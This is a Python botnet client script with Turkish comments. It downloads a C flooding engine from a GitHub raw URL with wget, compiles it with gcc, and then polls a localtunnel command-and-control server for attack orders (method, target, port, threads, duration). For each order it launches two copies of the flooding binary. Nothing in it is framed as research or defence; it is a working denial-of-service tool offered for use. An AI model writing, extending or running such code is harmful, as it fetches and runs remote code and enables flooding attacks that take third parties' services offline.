#!/usr/bin/env python3
import os
import time
import requests
import subprocess

# --- AYARLAR ---
MASTER_URL = "https://ordu-komutan-3.loca.lt" 
ZOMBI_AD = f"Zombi-{os.uname()[1]}"

def temizlik_yap():
    print("🧹 Eski mühimmatlar temizleniyor...")
    # Eski python dosyalarını ve logları temizle
    os.system("rm -f attack.py* slave.py* attack.log mermi mermi.c")
    
    print("📦 C-Engine ve kütüphaneler depodan çekiliyor...")
    # GitHub'dan o canavar C kodunu çekiyoruz
    os.system("wget -q https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/mermi.c")
    
    print("🛠️ Mermi Çekirdeği derleniyor (Jet Modu)...")
    # C kodunu pthreads desteğiyle en yüksek optimizasyonda derle
    derleme_durumu = os.system("gcc -O3 mermi.c -o mermi -lpthread")
    
    if derleme_durumu == 0:
        print("✅ C-Engine başarıyla derlendi ve namluya sürüldü!")
        os.system("chmod +x mermi")
    else:
        print("❌ HATA: C derlenemedi, sistemde gcc kurulu olduğundan emin ol.")

def komut_dinle():
    print(f"🚀 {ZOMBI_AD} görev yerinde! Mermi Engine hazır.")
    print(f"📡 Beyin Bağlantısı: {MASTER_URL}")
    
    while True:
        try:
            headers = {'bypass-tunnel-reminder': 'true', 'User-Agent': 'Zombi-C-Power'}
            response = requests.get(f"{MASTER_URL}/get_command", headers=headers, timeout=15)
            
            if response.status_code == 200:
                data = response.json()
                method = data.get("method")
                target = data.get("target")
                port = data.get("port")
                t = data.get("threads")
                s = data.get("duration")

                if method and target:
                    # Eğer threads belirtilmemişse varsayılan 100 yapıyoruz (C için ideal)
                    thread_sayisi = t if t else 100
                    print(f"\n[!] SUPREME EMİR: {method.upper()} -> {target}:{port} | Kol: {thread_sayisi}")

                    # Eğer mermi çekirdeği bir şekilde silindiyse tekrar çek ve derle
                    if not os.path.exists("./mermi"):
                        print("⚠️ Mermi kayıp, yeniden hazırlanıyor...")
                        os.system("wget -q https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/mermi.c")
                        os.system("gcc -O3 mermi.c -o mermi -lpthread")

                    # ARTIK PYTHON DEĞİL, C MOTORUNU TETİKLİYORUZ
                    attack_cmd = [
                        "./mermi", 
                        str(method), str(target), str(port), 
                        str(thread_sayisi), str(s)
                    ]
                    
                    with open("attack.log", "a") as log_file:
                        # C zaten içinde thread açtığı için 1-2 işlem başlatmak hattı doyurur
                        # Biz yine de garanti olsun diye 2 koldan C'yi ateşliyoruz
                        for i in range(2):
                            subprocess.Popen(attack_cmd, stdout=log_file, stderr=log_file)
                    
                    print(f"✅ GÜÇ VERİLDİ: C-Engine %100 kapasiteyle mermi kusuyor!")

            time.sleep(3)
            
        except Exception as e:
            print(f"⚠️ Bağlantı bekleniyor... ({e})")
            time.sleep(10)

if __name__ == "__main__":
    temizlik_yap() # Önce motoru hazırlar (C derler)
    komut_dinle()  # Sonra emir bekler
